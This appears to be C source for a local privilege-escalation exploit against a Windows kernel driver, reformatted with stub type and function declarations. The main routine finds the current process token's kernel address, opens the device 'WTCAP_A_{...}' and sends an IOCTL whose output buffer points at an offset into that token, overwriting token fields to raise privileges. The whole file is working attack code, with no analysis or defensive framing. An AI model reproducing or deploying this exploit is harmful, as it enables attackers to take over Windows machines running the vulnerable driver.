
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef scalar_t__ HANDLE ;
typedef int DWORD ;


 int CloseHandle (scalar_t__) ;
 scalar_t__ CreateFileA (char*,int,int ,int *,int ,int ,int *) ;
 int DebugBreak () ;
 int DeviceIoControl (scalar_t__,int ,int *,int,void*,int *,int *,int *) ;
 int FILE_ATTRIBUTE_NORMAL ;
 void* FindTokenAddressHandles (int ) ;
 int GENERIC_READ ;
 int GENERIC_WRITE ;
 int GetCurrentProcess () ;
 int GetCurrentProcessId () ;
 int GetLastError () ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int OPEN_EXISTING ;
 int OpenProcessToken (int ,int ,scalar_t__*) ;
 int SL_IOCTL_GET_EVENT_NAME ;
 int TOKEN_QUERY ;
 int fprintf (int ,char*,...) ;
 int getchar () ;
 int stderr ;

void main()
{
 DWORD dwBytesReturned;
 DWORD ShellcodeFakeMemory;
 HANDLE token;



 if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&token))
  DebugBreak();

 void* TokenAddress = FindTokenAddressHandles(GetCurrentProcessId());

 CloseHandle(token);


 HANDLE hDriver = CreateFileA("\\\\.\\WTCAP_A_{B8296C9f-8ed4-48A2-84A0-A19DB94418E3}",GENERIC_READ | GENERIC_WRITE,0,((void*)0),OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,((void*)0));
  if(hDriver!=INVALID_HANDLE_VALUE)
  {
    fprintf(stderr," Open Driver OK\n");

   if (!DeviceIoControl(hDriver, SL_IOCTL_GET_EVENT_NAME, ((void*)0),0x80,(void*)((char*)TokenAddress+0x34),((void*)0),&dwBytesReturned, ((void*)0)))
   {
    fprintf(stderr,"send IOCTL error %d.\n",GetLastError());
    return;
   }
   else fprintf(stderr," Send IOCTL OK\n");
  }

  else
  {
   fprintf(stderr," Open Driver error %d.\n",GetLastError());
   return;
  }


  CloseHandle(hDriver);
  getchar();

}
